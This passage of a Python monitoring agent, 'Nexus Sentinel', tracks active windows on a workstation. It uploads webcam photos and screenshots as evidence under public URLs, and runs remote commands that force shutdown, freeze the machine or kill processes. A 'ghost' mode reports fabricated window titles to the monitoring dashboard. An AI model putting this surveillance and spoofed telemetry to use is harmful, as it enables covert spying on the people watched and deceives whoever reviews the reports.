            blob_path = CACHE_DIR / cam_file
            if blob_path.exists():
                try:
                    sb.storage.from_(EVIDENCE_BUCKET).upload(
                        f"{payload['workstation_id']}/vault-{row_id}-webcam.jpg",
                        blob_path.read_bytes(),
                        {"content-type": "image/jpeg", "upsert": "true"},
                    )
                    webcam_url = sb.storage.from_(EVIDENCE_BUCKET).get_public_url(
                        f"{payload['workstation_id']}/vault-{row_id}-webcam.jpg"
                    )
                except Exception as e:
                    raise RuntimeError(f"webcam surge failed: {e}")


        res = sb.table(table_name).insert(payload).execute()
        if not res.data:
            raise RuntimeError(f"{table_name} insert returned no rows")


        if kind == "alert":
            new_alert_id = res.data[0].get("id")
            ev_meta = dict(evidence.get("meta") or {})
            ev_meta["is_backlogged"] = True
            ev_row = {
                "alert_id": new_alert_id,
                "metadata": ev_meta,
            }
            if screenshot_url: ev_row["screenshot_url"] = screenshot_url
            if webcam_url: ev_row["webcam_url"] = webcam_url
            try:
                sb.table("evidence_logs").insert(ev_row).execute()
            except Exception as e:
                print(f"[sync] evidence_logs surge non-fatal: {e}", file=sys.stderr)


        _delete_cache(screen_file)
        _delete_cache(cam_file)
        vault_delete(row_id)
        print(f"[sync] surged row #{row_id} ({table_name}) ts={created_at}")
        return True

    except Exception as e:
        vault_bump_attempt(row_id, str(e))
        print(f"[sync] row #{row_id} surge failed (attempt {attempts+1}): {e}", file=sys.stderr)
        return False


def sync_daemon() -> None:
    """
    Phase 6 — The Surge.
    Probes connectivity every SYNC_INTERVAL seconds. When the network is
    back, drains the SQLite queue in batches. Runs entirely in the
    background without touching scan_loop's cadence.
    """
    print(f"[sync] daemon armed — probing every {SYNC_INTERVAL}s")
    while True:
        try:
            time.sleep(SYNC_INTERVAL)
            pending = vault_pending(limit=25)
            if not pending:
                continue
            if not _supabase_alive():
                print(f"[sync] {len(pending)} legacy item(s) waiting — link still down")
                continue
            print(f"[sync] connection restored — surging {len(pending)} legacy item(s)")
            wins = 0
            for row in pending:
                if _surge_one(row):
                    wins += 1
                else:

                    break
            print(f"[sync] surge complete: {wins}/{len(pending)} cleared")
        except Exception as e:
            print(f"[sync] daemon error: {e}", file=sys.stderr)


def scan_loop(workstation_id: str) -> None:
    global GHOST_ACTIVE
    last_alerted, last_ambient, last_proc_seen = {}, {}, None

    while True:
        if GHOST_ACTIVE:
            FOCUS.refresh_if_stale()
            available_apps = list(FOCUS.whitelist)
            if available_apps:
                rotation_index = (int(time.time()) // 120) % len(available_apps)
                proc = available_apps[rotation_index]
                if "code" in proc: title = "NexusSentinel - sentinel_agent.py - Visual Studio Code"
                elif "chrome" in proc or "edge" in proc: title = "Research - Google Search - Google Chrome"
                else: title = f"{proc.split('.')[0].capitalize()} - Institutional Workspace"
            else:
                proc, title = "explorer.exe", "Windows Explorer"
            hit, severity = None, "info"
        else:
            title, proc = get_foreground_window()

        if title or proc:
            try:
                sb.table("workstations").update({
                    "current_window": title,
                    "current_process": proc,
                }).eq("id", workstation_id).execute()
            except Exception:
                pass
                
            if not GHOST_ACTIVE:
                hit, severity = classify(title, proc)
                haystack = f"{title or ''} {proc or ''}"

                sem = consume_semantic_result(haystack)
                if sem is not None:
                    score, toks = sem
                    if score >= NSFW_PROB_THRESHOLD and SEVERITY_RANK["critical"] > SEVERITY_RANK[severity]:
                        hit = f"nsfw_semantic({score:.2f}):{'+'.join(toks[:4])}"
                        severity = "critical"
                submit_semantic_scan(haystack)

                has_vpn, vpn_reason = network_audit()
                if has_vpn and severity not in ("critical",):
                    hit, severity = vpn_reason, "high"

                has_masquerade, masq_reason = resource_entropy_check(proc)
                if has_masquerade and severity not in ("critical",):
                    hit, severity = masq_reason, "high"

                if hit and severity in ("high", "critical"):
                    if time.time() - last_alerted.get(hit, 0) > ALERT_DEBOUNCE_SEC:
                        last_alerted[hit] = time.time()
                        fire_alert(workstation_id, title or "", proc, severity, f"lexicon:{hit}")
                elif hit and severity in ("warning", "info"):
                    key = f"ambient:{hit}"
                    if time.time() - last_ambient.get(key, 0) > AMBIENT_DEBOUNCE_SEC:
                        last_ambient[key] = time.time()
                        log_ambient(workstation_id, title, proc, severity, is_anomaly=False)

                if FOCUS.enabled and proc and proc.lower() not in FOCUS.whitelist:
                    key = f"focus:{proc}"
                    if time.time() - last_alerted.get(key, 0) > ALERT_DEBOUNCE_SEC:
                        last_alerted[key] = time.time()
                        fire_alert(workstation_id, title or "", proc, "high", "focus_mode_violation")
                elif proc and proc != last_proc_seen and not hit:
                    if proc.lower() not in FOCUS.whitelist:
                        key = f"anomaly:{proc}"
                        if time.time() - last_ambient.get(key, 0) > AMBIENT_DEBOUNCE_SEC:
                            last_ambient[key] = time.time()
                            log_ambient(workstation_id, title, proc, "warning", is_anomaly=True)
                    last_proc_seen = proc

        time.sleep(SCAN_INTERVAL)

def heartbeat_loop(workstation_id: str) -> None:
    while True:
        try:
            sb.table("workstations").update({
                "status": "online",
                "last_heartbeat": now_iso(),
            }).eq("id", workstation_id).execute()
        except Exception as e:
            print(f"[heartbeat] {e}", file=sys.stderr)
        time.sleep(HEARTBEAT_INTERVAL)


def forensic_shutdown(workstation_id: str, action_id: str):
    print(f"[GAVEL] Parallel Forensic Strike Initiated (Action #{action_id})")

    def _upload_cam():
        cam = capture_webcam()
        if cam:
            url = upload_evidence(f"{workstation_id}/action-{action_id}-webcam.jpg", cam)
            if url:
                try: sb.table("evidence_logs").insert({"metadata": {"command": "terminate", "action_id": action_id, "is_backlogged": False}, "webcam_url": url}).execute()
                except Exception: pass

    def _upload_screen():
        screen = capture_screenshot()
        if screen:
            upload_evidence(f"{workstation_id}/action-{action_id}-screen.jpg", screen)

    threading.Thread(target=_upload_cam, daemon=True).start()
    threading.Thread(target=_upload_screen, daemon=True).start()

    print(f"[GAVEL] Upload payload airborne. System termination in {TERMINATE_GRACE_SEC}s.")
    time.sleep(TERMINATE_GRACE_SEC)

    system = platform.system()
    if system == "Windows": subprocess.call("shutdown /s /f /t 0", shell=True)
    elif system == "Darwin": subprocess.call(["sudo", "shutdown", "-h", "now"])
    else: subprocess.call(["shutdown", "-h", "now"])


def execute_command(cmd: str) -> None:
    system = platform.system()
    print(f"[GAVEL] {cmd.upper()} on {system}")
    if cmd == "lock":
        if system == "Windows":
            subprocess.call("rundll32.exe user32.dll,LockWorkStation", shell=True)
        elif system == "Darwin":
            subprocess.call(["pmset", "displaysleepnow"])
        else:
            subprocess.call(["loginctl", "lock-session"])


def _parse_iso(ts: str | None) -> datetime | None:
    if not ts:
        return None
    try:
        return datetime.fromisoformat(ts.replace("Z", "+00:00"))
    except Exception:
        return None


def action_loop(workstation_id: str) -> None:
    while True:
        try:

            res = (
                sb.table("admin_actions")
                .select("id, command, created_at, metadata")
                .eq("target_id", workstation_id)
                .eq("status", "pending")
                .execute()
            )

            now = datetime.now(timezone.utc)
            for action in res.data or []:
                created = _parse_iso(action.get("created_at"))


                if created and (now - created) > timedelta(seconds=COMMAND_TTL_SEC):
                    age = int((now - created).total_seconds())
                    print(f"[actions] EXPIRED ({age}s old) → {action['command']} #{action['id']}")
                    sb.table("admin_actions").update({"status": "expired"}).eq("id", action["id"]).execute()
                    continue


                sb.table("admin_actions").update({"status": "sent"}).eq("id", action["id"]).execute()

                cmd = action["command"]
                meta = action.get("metadata") or {}

                if cmd == "terminate":
                    threading.Thread(target=forensic_shutdown, args=(workstation_id, action["id"]), daemon=True).start()

                elif cmd in ("freeze", "lock_hardware") and WARDEN:

                    try:
                        duration = int(meta.get("duration", 300))
                    except (ValueError, TypeError):
                        duration = 300
                    WARDEN.engage_freeze(duration=duration)

                elif cmd == "unfreeze" and WARDEN:
                    WARDEN.disengage_freeze()

                elif cmd in ("kill_task", "kill", "scalpel") and WARDEN:

                    target = meta.get("process_name") or meta.get("process") or meta.get("target") or meta.get("target_name")
                    if target:
                        WARDEN.scalpel(target)
                    else:
                        print(f"[actions] Scalpel misfire: No target provided in metadata {meta}")

                else:
                    execute_command(cmd)

                sb.table("admin_actions").update({"status": "acknowledged"}).eq("id", action["id"]).execute()

        except Exception as e:
            print(f"[actions] {e}", file=sys.stderr)

        time.sleep(ACTION_POLL)


def main() -> None:
    print("--- NEXUS SENTINEL · Phase 6.4.0 (Sovereign) Forensic Vault ---")
    vault_init() # Opens the USB SQLite database first
    
    # Register workstation; if it fails, we still continue in local mode
    wid = None
    try:
        wid = register_workstation()
        print(f"[system] workstation_id={wid}")
    except Exception as e:
        print(f"[system] Registration error (continuing offline): {e}")

    # START THE FORENSIC ENGINES IMMEDIATELY
    threads = [
        threading.Thread(target=heartbeat_loop, args=(wid,), daemon=True) if wid else None,
        threading.Thread(target=scan_loop, args=(wid,), daemon=True),
        threading.Thread(target=action_loop, args=(wid,), daemon=True) if wid else None,
        threading.Thread(target=listen_for_sovereignty, daemon=True),
        threading.Thread(target=hardware_panic_listener, daemon=True),
        threading.Thread(target=sync_daemon, daemon=True),
    ]
    for t in threads:
        if t: t.start()

    # Move cloud storage verification to a background thread so it can't hang the agent
    threading.Thread(target=ensure_bucket, daemon=True).start()

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("[system] Sovereign detachment. Agent offline.")
        try:
            sb.table("workstations").update({"status": "offline"}).eq("id", wid).execute()
        except Exception:
            pass


if __name__ == "__main__":
    main()
